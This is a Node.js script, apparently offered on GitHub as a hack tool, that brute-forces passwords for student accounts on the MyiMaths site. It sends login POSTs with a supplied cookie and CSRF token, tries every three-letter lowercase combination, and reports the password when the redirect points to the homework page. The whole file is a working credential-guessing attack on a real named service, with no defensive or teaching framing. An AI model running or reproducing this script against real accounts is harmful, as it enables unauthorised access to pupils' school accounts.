#!/usr/bin/env node
const args = process.argv.slice(2)
if (args.length < 4) {
  console.log('Usage: ./hack.js <Cookie on https://app.myimaths.com> <Login number> <Login page URL> <Session CSRF Token>')
  process.exit(1)
}

const cookie = args[0]
const user = parseInt(args[1])
const loginUrl = args[2]
const csrf = args[3]

const request = require('request')

const metaHeader = {
  'Accept': 'text/html,application/xhtml+xml,application/xml',
  'Accept-Language': 'en,zh;q=0.8',
  'Origin': 'https://app.myimaths.com',
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'Cookie': cookie,
  'Referer': loginUrl
}

let tryPasswd = pwd => {
  console.log(pwd)
  return new Promise((resolve, reject) => {
    request({
      url: 'https://app.myimaths.com/myportal/student/authenticate',
      method: 'post',
      headers: metaHeader,
      followRedirect: false,
      form: {
        'authenticity_token': csrf,
        'student[user_name]': user,
        'student[password]': pwd
      }
    }, (err, icm, res) => {
      if (err) {
        console.error(err)
        console.log('Sorry, something goes wrong at ' + pwd + '... Will try again.')
        tryPasswd(pwd).then(resolve, reject)
        return
      }
      if (icm.statusCode !== 302) {
        console.log(icm.statusCode)
        console.log(JSON.stringify(res.substr(0, 200)))
        console.log("Sorry, This don't work anymore. Fire a GitHub issue now!")
        process.exit(3)
        return
      }
      let location = icm.headers['location']
      if (location === 'https://app.myimaths.com/myportal/library/15') {
        reject()
      } else if (location === 'https://app.myimaths.com/myportal/student/my_homework') {
        resolve()
      } else {
        console.log(location)
        console.log("Sorry, This don't work anymore. Fire a GitHub issue now!")
      }
    })
  })
}

let letters = 'abcdefghijklmnopqrstuvwxyz'.split('')

let try3 = (a, b, c, callback) => {
  if (c >= letters.length) {
    callback()
    return
  }

  let pwd = letters[a] + letters[b] + letters[c]
  tryPasswd(pwd).then(() => {
    console.log('Password: ' + pwd)
    process.exit(0)
  }, () => {
    try3(a, b, c + 1, callback)
  })
}

let try2 = (a, b, callback) => {
  if (b >= letters.length) {
    callback()
    return
  }

  try3(a, b, 0, () => {
    try2(a, b + 1, callback)
  })
}

let try1 = (aRangeL, aRangeR, callback) => {
  let flag = aRangeR - aRangeL
  for (let i = aRangeL; i < aRangeR; i ++) {
    try2(i, 0, () => {
      console.log(`${letters[i]}xx finished.`)
      flag--
      if (flag === 0) {
        callback()
      }
    })
  }
}

try1(0, letters.length, () => {console.log('...')})
